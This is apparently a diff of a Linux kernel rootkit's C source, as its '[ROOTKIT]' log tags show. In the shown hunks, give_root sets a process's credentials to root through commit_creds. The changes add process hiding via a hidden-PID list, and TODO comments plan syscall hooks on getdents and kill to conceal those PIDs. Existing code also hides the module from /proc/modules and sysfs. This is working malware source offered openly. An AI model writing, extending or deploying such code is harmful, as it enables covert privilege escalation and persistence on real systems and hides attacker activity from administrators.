@@ -2,31 +2,42 @@
 
 #include "inc/constants.h"
 #include "inc/macro_utils.h"
+#include <asm/current.h>
 #include <linux/cred.h>
+#include <linux/errno.h>
 #include <linux/export.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/printk.h>
 #include <linux/types.h>
 
-void give_root(const pid_t i32_pid, const int i32_sig)
+LIST_HEAD(hidden_pids_list);
+
+/**
+ * Gets the effective PID for the given PID.
+ * If the given PID is 0, return the current PID.
+ * If the given PID is -1 or INT_MIN, return -1.
+ * If the given PID is < -1, return the absolute value.
+ * Otherwise, return the given PID.
+ *
+ * @param i32_pid The PID to get the effective PID for
+ * @return The effective PID
+ */
+static inline int get_effective_pid(const pid_t i32_pid)
 {
-    struct cred *p_creds = NULL; // Pointer to the current task credentials
+    pid_t i32_real_pid = i32_pid;
 
-    // Get the current task credentials
-    p_creds = prepare_creds();
-
-    IF_U (p_creds == NULL) {
-        pr_err("[ROOTKIT] * Failed to get credentials\n");
-        return;
+    if (i32_real_pid == 0) {
+        i32_real_pid = current->pid;
+    }
+    else if (i32_real_pid == INT_MIN) {
+        return -1;
+    }
+    else if (i32_real_pid < -1) {
+        i32_real_pid = -i32_real_pid;
     }
 
-    __SET_UIDS(p_creds, ROOT_UID);
-    __SET_GIDS(p_creds, ROOT_GID);
-
-    commit_creds(p_creds);
-
-    pr_info("[ROOTKIT] * Process is now root\n");
+    return i32_real_pid;
 }
 
 void hide_module(void)
@@ -40,12 +51,124 @@ void hide_module(void)
     pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
 }
 
-int hide_process(const pid_t i32_pid, const int i32_sig)
+void show_all_processes(void)
+{
+    hidden_pid_t *p_hidden_pid = NULL; // Hidden PID structure
+    hidden_pid_t *p_tmp        = NULL; // Temporary pointer for iteration
+
+    pr_info("[ROOTKIT] Unhiding all processes...\n");
+
+    // Remove all PIDs from the hidden list
+    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
+        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
+        list_del(&p_hidden_pid->list);
+        kfree(p_hidden_pid);
+    }
+}
+
+bool is_process_hidden(const pid_t i32_pid)
+{
+    const hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
+    const pid_t i32_real_pid         = get_effective_pid(i32_pid); // Effective PID to check
+
+    if (i32_real_pid == -1) {
+        return false;
+    }
+
+    pr_info("[ROOTKIT] * Hidden PIDs:\n");
+    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
+        pr_info("[ROOTKIT]   - %d\n", p_hidden_pid->i32_pid);
+    }
+
+    // Check if the given PID is in the hidden list
+    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
+        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
+                p_hidden_pid->i32_pid, i32_real_pid);
+        if (p_hidden_pid->i32_pid == i32_real_pid) {
+            pr_cont(" found!\n");
+            return true;
+        }
+        else {
+            pr_cont(" not found\n");
+        }
+    }
+
+    return false;
+}
+
+long give_root(const pid_t i32_pid, const int i32_sig)
+{
+    struct cred *p_creds = NULL; // Pointer to the current task credentials
+
+    // Get the current task credentials
+    p_creds = prepare_creds();
+
+    IF_U (p_creds == NULL) {
+        pr_err("[ROOTKIT] * Failed to get credentials\n");
+        return -EPERM;
+    }
+
+    __SET_UIDS(p_creds, ROOT_UID);
+    __SET_GIDS(p_creds, ROOT_GID);
+
+    commit_creds(p_creds);
+
+    pr_info("[ROOTKIT] * Process is now root\n");
+
+    return 0;
+}
+
+long hide_process(const pid_t i32_pid, const int i32_sig)
 {
     // TODO
     // Create a global list of hidden PIDs
-    // Add the given PID to the list
+    // Add the given PID to the list (if given PID is 0, add the current PID)
     // When a call to getdent is made, check if the dir is /proc (hide the PID), or
     // or if the dir is /proc/PID or a child (return ENOENT for open, getdents, etc.)
-    return 1;
+    // When a call to kill is made, check if the PID is in the list (return ESRCH if it is)
+
+    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
+    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
+
+    if (i32_real_pid == -1) {
+        return -EPERM;
+    }
+
+    pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);
+
+    p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
+    IF_U (p_hidden_pid == NULL) {
+        pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
+        return -EPERM;
+    }
+
+    // Add the given PID to the list (if it is 0, add the current PID)
+    p_hidden_pid->i32_pid = i32_real_pid;
+
+    list_add(&p_hidden_pid->list, &hidden_pids_list);
+
+    return 0;
+}
+
+long show_process(const pid_t i32_pid, const int i32_sig)
+{
+    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
+    hidden_pid_t *p_tmp        = NULL;                       // Temporary pointer for iteration
+    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
+
+    if (i32_real_pid == -1) {
+        return -EPERM;
+    }
+
+    pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);
+
+    // Remove the given PID from the hidden list (if it is 0, remove the current PID)
+    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
+        if (p_hidden_pid->i32_pid == i32_real_pid) {
+            list_del(&p_hidden_pid->list);
+            kfree(p_hidden_pid);
+        }
+    }
+
+    return 0;
 }
